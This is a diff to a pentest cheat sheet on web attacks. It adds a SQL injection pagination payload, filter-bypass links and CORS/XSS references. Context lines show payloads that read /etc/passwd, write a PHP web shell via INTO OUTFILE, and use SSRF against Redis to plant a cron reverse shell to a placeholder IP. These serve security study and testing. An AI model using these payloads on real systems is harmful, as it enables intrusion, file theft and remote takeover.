@@ -234,9 +234,17 @@ BEUST: Blind,Error,Union,Stacked,Time-based
  ' union select id, origine, message, 0 from chall #
 ```
 
+### Pagination
+
+- https://www.geeksforgeeks.org/pagination-in-sql/
+
+```sql
+' UNION SELECT username from table LIMIT 1 OFFSET X # 0||1||2 etc.. 
+```
+
 ### R/W file
 
-```
+```sql
 # Read file
 UNION SELECT LOAD_FILE ("etc/passwd")-- 
 
@@ -249,6 +257,11 @@ UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
 - https://pentestmonkey.net/category/tools/audit
 
 `Protection`: [quoted & prepared statements](https://phpdelusions.net/mysqli_examples/prepared_select)
+
+### Bypass Filters
+
+- https://websec.wordpress.com/tag/sql-filter-bypass/
+- https://johnermac.github.io/notes/ewptx/sqlievasion/
 
 ## NoSQLi
 
@@ -333,6 +346,7 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 ## Doc - Client
 
 - https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
+- https://portswigger.net/web-security/cors
 - https://www.devsecurely.com/blog/2024/06/cors-the-ultimate-guide
 - https://nathandavison.com/blog/corsing-a-denial-of-service-via-cache-poisoning
 
@@ -390,11 +404,13 @@ Voir aussi `elements`
 
 ## XSS
 
+ - https://excess-xss.com/
  - https://liveoverflow.com/do-not-use-alert-1-in-xss/
  - https://beta.hackndo.com/attaque-xss/
- - https://excess-xss.com/
+ - https://github.com/s0md3v/AwesomeXSS/
  - https://learn-cyber.net/article/Self-XSS-Attacks
  - https://learn-cyber.net/article/Reflected-XSS-Attacks
+ - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 ### Filters bypass
 
